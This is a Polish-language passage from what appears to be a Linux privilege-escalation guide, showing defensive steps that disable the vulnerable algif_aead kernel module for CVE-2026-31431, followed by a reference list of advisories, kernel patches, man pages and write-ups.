Jeśli podatny interfejs jest udostępniany przez ładowalny moduł:<sup>[[6]](#references)[[28]](#references)[[29]](#references)</sup>

```bash
echo "install algif_aead /bin/false" > /etc/modprobe.d/disable-algif.conf
rmmod algif_aead 2>/dev/null || true
```

Jeśli jest skompilowany w jądrze, w niektórych zgłoszeniach opisano blokowanie ścieżki init za pomocą:<sup>[[28]](#references)</sup>

```bash
initcall_blacklist=algif_aead_init
```

Tę metodę łagodzenia skutków warto mieć na uwadze także w przypadku innych kernel LPE: jeśli exploit zależy od konkretnego opcjonalnego interfejsu, wyłączenie lub umieszczenie go na czarnej liście może zablokować ścieżkę exploita, zanim będzie dostępna pełna aktualizacja kernela.<sup>[[6]](#references)[[28]](#references)</sup>



## References

- [1] [HTB Bamboo – przejęcie skryptu uruchamianego przez root w zapisywalnym przez użytkownika katalogu PaperCut](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [2] [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)
- [3] [Tenable: Copy Fail (CVE-2026-31431) — FAQ](https://www.tenable.com/blog/copy-fail-cve-2026-31431-frequently-asked-questions-about-linux-kernel-privilege-escalation)
- [4] [Ujawnienie podatności CVE-2026-31431 na liście Openwall oss-security](https://www.openwall.com/lists/oss-security/2026/04/29/23)
- [5] [Poprawka w Linux stable: crypto: algif_aead — przywrócenie operacji poza miejscem](https://git.kernel.org/stable/c/a664bf3d603dc3bdcf9ae47cc21e0daec706d7a5)
- [6] [Copy Fail — opis podatności CVE-2026-31431](https://copy.fail/)
- [7] [Techniczny opis Theori / Xint](https://xint.io/blog/copy-fail-linux-distributions)
- [8] [Repozytorium DirtyClone / README](https://github.com/rafaeldtinoco/security/tree/main/exploits/dirtyclone)
- [9] [JFrog: analiza i wykorzystanie wariantu Linux LPE DirtyClone (CVE-2026-43503)](https://research.jfrog.com/post/dissecting-and-exploiting-linux-lpe-variant-dirtyclone-cve-2026-43503/)
- [10] [Poprawka Linux: net: skb: zachowanie `SKBFL_SHARED_FRAG` w `__pskb_copy_fclone()` (`48f6a5356a33`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=48f6a5356a33)
- [11] [Wcześniejsze łagodzenie skutków w Linux: ustawienie `SKBFL_SHARED_FRAG` dla pakietów UDP przesyłanych przez splice (`f4c50a4034e6`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=f4c50a4034e6)
- [12] [ld.so(8) — strona podręcznika Linuxa](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [13] [Git Hooks](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks)
- [14] [crontab(5) — strona podręcznika Linuxa](https://man7.org/linux/man-pages/man5/crontab.5.html)
- [15] [run-parts(8) — strona podręcznika Debiana](https://manpages.debian.org/bookworm/debianutils/run-parts.8.en.html)
- [16] [systemd.service](https://github.com/systemd/systemd/blob/main/man/systemd.service.xml)
- [17] [systemd.socket](https://github.com/systemd/systemd/blob/main/man/systemd.socket.xml)
- [18] [systemd.unit](https://github.com/systemd/systemd/blob/main/man/systemd.unit.xml)
- [19] [systemd.exec](https://github.com/systemd/systemd/blob/main/man/systemd.exec.xml)
- [20] [systemd.timer](https://github.com/systemd/systemd/blob/main/man/systemd.timer.xml)
- [21] [binfmt_misc — dokumentacja Linux Kernel](https://www.kernel.org/doc/html/latest/admin-guide/binfmt-misc.html)
- [22] [Powiązania aplikacji MIME](https://specifications.freedesktop.org/mime-apps/1.0.1/file.html)
- [23] [Specyfikacja Shared MIME-info](https://specifications.freedesktop.org/shared-mime-info/latest-single/)
- [24] [Specyfikacja Desktop Entry](https://specifications.freedesktop.org/desktop-entry/latest-single/)
- [25] [pspy](https://github.com/DominicBreuker/pspy)
- [26] [Język Kconfig](https://docs.kernel.org/kbuild/kconfig-language.html)
- [27] [Makefile Linux crypto](https://raw.githubusercontent.com/torvalds/linux/master/crypto/Makefile)
- [28] [CERT VU#260001: podatność pamięci podręcznej stron AF_ALG w jądrze Linux](https://kb.cert.org/vuls/id/260001)
- [29] [modprobe(8) — strona podręcznika Linuxa](https://man7.org/linux/man-pages/man8/modprobe.8.html)
- [30] [0xdf — HTB: Nexus](https://0xdf.gitlab.io/2026/09/02/htb-nexus.html)
- [31] [Dokumentacja Git `hash-object`](https://git-scm.com/docs/git-hash-object)
- [32] [Dokumentacja Git `ls-tree`](https://git-scm.com/docs/git-ls-tree)
- [33] [Dokumentacja konfiguracji Git](https://git-scm.com/docs/git-config)
- [34] [`openat2(2)` — strona podręcznika Linuxa](https://man7.org/linux/man-pages/man2/openat2.2.html)
- [35] [Dokumentacja generatorów systemd](https://github.com/systemd/systemd/blob/main/man/systemd.generator.xml)
- [36] [Elastic Security Labs — inżynieria wykrywania w Linux: mechanizmy utrwalania dostępu](https://www.elastic.co/security-labs/threat-command/primer-on-persistence-mechanisms)
{{#include ../../banners/hacktricks-training.md}}
